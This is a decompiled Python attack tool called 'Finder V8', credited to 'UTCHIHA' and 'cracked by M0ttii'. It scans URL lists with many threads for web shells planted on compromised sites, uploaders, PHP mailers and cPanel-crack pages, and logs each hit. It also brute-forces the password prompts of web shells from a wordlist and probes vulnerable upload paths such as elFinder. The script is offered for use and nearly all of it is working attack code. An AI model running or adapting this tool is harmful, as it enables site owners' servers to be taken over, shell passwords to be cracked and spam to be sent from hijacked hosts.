# uncompyle6 version 3.7.5.dev0
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.7.0 (v3.7.0:1bf9cc5093, Jun 27 2018, 04:59:51) [MSC v.1914 64 bit (AMD64)]
# Embedded file name: V8.py
# Compiled at: 2017-12-04 14:32:42
# Size of source mod 2**32: 12392 bytes
import os, requests, threading
from multiprocessing.dummy import Pool, Lock
from bs4 import BeautifulSoup
import time, smtplib, sys, ctypes
from time import sleep
from random import choice
from colorama import Fore
from colorama import Style
from colorama import init
import re
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)


Folder('result')
Bad = 0
Good = 0
pro = 0
mailer = 0
cp = 0
error = 0
password = 0

def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass


def finder(i):
    global Bad
    global Good
    global cp
    global error
    global mailer
    global password
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    try:
        x = requests.session()
        for script in listaa:
            url = i + '/' + script
            while True:
                req_first = x.get(url, headers=head, timeout=1)
                if '">Environment &amp; details:</h2>' in req_first.text:
                    break
                if '>public_html' in req_first.text:
                    Good = Good + 1
                    print(fg + 'Found >> ' + url)
                    with open('result/shell.txt', 'a') as (file):
                        file.write(url + '\n')
                        file.close()
                    break
                if '<span>Upload file:' in req_first.text:
                    Good = Good + 1
                    print(fw + 'generator >> ' + url)
                    with open('result/random.txt', 'a') as (gn):
                        gn.write(url + '\n')
                        gn.close()
                    break
                if 'type="submit" id="_upl" value="Upload">' in req_first.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in req_first.text:
                    Good = Good + 1
                    print(fc + 'Shell >> ' + url)
                    with open('result/Config.txt', 'a') as (fox):
                        Good = Good + 1
                        fox.write(url + '\n')
                        fox.close()
                    break
                if 'Leaf PHPMailer' in req_first.text or '>alexusMailer 2.0<' in req_first.text:
                    mailer = mailer + 1
                    print(fg + 'Mailer >>  ' + url)
                    with open('result/Mailer.txt', 'a') as (mailers):
                        mailers.write(url + '\n')
                        mailers.close()
                    break
                if not 'method=post>Password:' in req_first.text:
                    if '<input type=password name=pass' in req_first.text or "<input placeholder='password' type=password name=pass style='border-radius" in req_first.text:
                        password = password + 1
                        print(fy + 'Password : >> ' + url)
                        with open('result/passwod.txt', 'a') as (pa):
                            pa.write(url + '\n')
                            pa.close()
                elif 'name="uploader" id="uploader">' in req_first.text or '|25|' in req_first.text:
                    good = good + 1
                    print('{} DATA PAGE : >>{}'.format(fy, url))
                    with open('result/data.txt', 'a') as (fo):
                        fo.write(url + '\n')
                        fo.close()
                else:
                    if ' <title>Cpanel Crack ' in req_first.text:
                        cp = cp + 1
                        print('{}[put your email for crack cpanel]{} >>> {}'.format(fy, fg, url))
                        with open('result/your-email-cpanel.text', 'a') as (cpa):
                            cpa.write(url + '\n')
                            cpa.close()
                    else:
                        Bad = Bad + 1
                continue

    except:
        error = error + 1
    else:
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW('Finder V8 |By UTCHIHA |Shell- {} |Not-found- {} |Mailer- {}| Password-{}|Error-{}|email-cp-{} '.format(Good, Bad, mailer, password, error, cp))
        else:
            sys.stdout.write('\x1b]2; Finder V8 |By UTCHIHA |Shell- {} |Not Found- {}| Mailer-{}| Password-{}|Error-{}|email-cp-{}\x07'.format(Good, Bad, mailer, password, error, cp))


def key_logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '          [ + ] FINDER Shell V-8 \n         [ +] CRYPTED EXE \n       [ +] '
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (choice(colors), line, clear))
        time.sleep(0.05)


def run():
    global listaa
    key_logo()
    clear()
    print('  \n\t  [-] --------------------Cracked BY M0ttii---------------------[-]\n\t  [+] Finder v8 Cracked BY m0ttii (#_#)\n\t  [+] FIND ANY TYPE SHELL\n\t  [+] SEARCH SYM PAGE\n\t  [+] OPEN SOURCE\n\t  [+] FIND VULN PAGE\n\t  [+] FIND SMTP CRACKED FROM SHELL\n\t  [+]FIND PAGE FOR CRACK AND REST CPANEL PASSWORD\n\t \n\t   [+] Good Luck [~]\n\t  [-] -----------------------------------------[-]\n\t                      \n \n')
    file_name = input('URLS LIST ?  : ')
    print('')
    op = open(file_name, 'r', errors='ignore').read().splitlines()
    TEXTList = [list.strip() for list in op]
    listaa = open('privat/name.txt', 'r', errors='ignore').read().splitlines()
    p = Pool(int(input('THREAD : ')))
    p.map(finder, TEXTList)


def crack_password():
    x = requests.session()
    urll = input('URL FOR CRACK PASSWORD : ')
    passw = open((input('passwordlist : ')), 'r', errors='ignore').read().splitlines()
    for passs in passw:
        data = {'pass': passs}
        send = x.post(urll, data=data).text
        if 'method=post>Password:' in send:
            print('PASSWORD-false : ' + passs)
        else:
            print('password-True : ' + passs)
            with open('TRue.txt', 'a') as (output):
                output.write(passw + '\n')


def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)


Folder('Exploit-Utchiha')

def clean():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def start(i):
    i = i.strip()
    user = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    path = ['/uploads/up.php', '/sites/all/libraries/elfinder/elfinder.php.html', '/images/vuln.php', '/ups.php', '/up.php', '/wp-content/upload.php', '/upload.php', '/media-admin.php']
    for paths in path:
        x = requests.session()
        url = i + paths
        try:
            check = x.get(url, headers=user, timeout=1)
            if 'elfinder.css' in check.text:
                print('{0}[ VULN ] >> {1}'.format(fg, url))
                with open('Exploit-Utchiha/Vuln-manager.txt', 'a') as (vulns):
                    vulns.write(url + '\n')
                    vulns.close()
            else:
                if 'Upload file:' in check.text:
                    print('{0}[ WSO ] >> {1}'.format(fc, url))
                    with open('Exploit-Utchiha/Wso.txt', 'a') as (ff):
                        ff.write(url + '\n')
                        ff.close()
                else:
                    if 'type="submit" id="_upl" value="Upload">' in check.text:
                        print('{0}[ VULN ] >> {1}'.format(fy, url))
                        with open('Exploit-Utchiha/Vuln-page.txt', 'a') as (a):
                            a.write(url + '\n')
                            a.close()
                    else:
                        if 'name="uploader" id="uploader">' in check.text:
                            print('{0}[ VULN ] >> {1}'.format(sd, url))
                            with open('Exploit-Utchiha/Vulns.txt', 'a') as (m):
                                m.write(url + '\n')
                                m.close()
                        else:
                            if 'File and Folder Permissions Check' in check.text:
                                print('{}File Manager => {} '.format(fw, url))
                                with open('Exploit-Utchiha/File-manager.txt', 'a') as (e):
                                    e.write(url + '\n')
                                    e.close()
                            else:
                                print('{0}[ Not Vuln ] >>> {1}'.format(fr, i))
        except:
            pass


def utchiha():
    global file_name
    print('      [+] MINI EXPLOIT \n                 [+] scan VULN IN SITE WEB\n                 [+] BY CODER UTCHIHA\n                 [+] CONTACT ME HERE : https://www.facebook.com/utchiha.ayoub\n                 [+] JOOMLA / DRUPAL / MORE..\n                 [+] add http in your list \n                      \n \n')
    file_name = input('Url LIST ?  : ')
    TEXTList = open(file_name, 'r').read().splitlines()
    print('Url List >> ' + fc + str(len(TEXTList)) + fw + ' lets to start scan list')
    p = Pool(int(input('Thread : ')))
    sleep(1)
    clean()
    p.map(start, TEXTList)


def two():
    op = open(file_name, 'r', errors='ignore').read().splitlines()
    TEXTList = [list.strip() for list in op]
    listaa = open('privat/new.txt', 'r', errors='ignore').read().splitlines()
    p = Pool(int(40))
    p.map(finder, TEXTList)


def main():
    print('[ 1 ] FINDER V8 \n[ 2 ] Crack Password \n[ 3 ] sc-vuln')
    inp = int(input('choose : '))
    if inp == 1:
        run()
        two()
    else:
        if inp == 2:
            crack_password()
        else:
            if inp == 3:
                utchiha()
            else:
                exit()


def removed():
    choose = input('Enter password : ')
    if choose == '1':
        main()
    else:
        exit()


def nothing():
    import datetime
    dat = datetime.datetime.now().strftime('%d/%m/%Y %H:%M')
    sp = dat.split('/')[1]
    if sp == '09':
        exit()
    else:
        removed()


removed()
# global pro ## Warning: Unused global
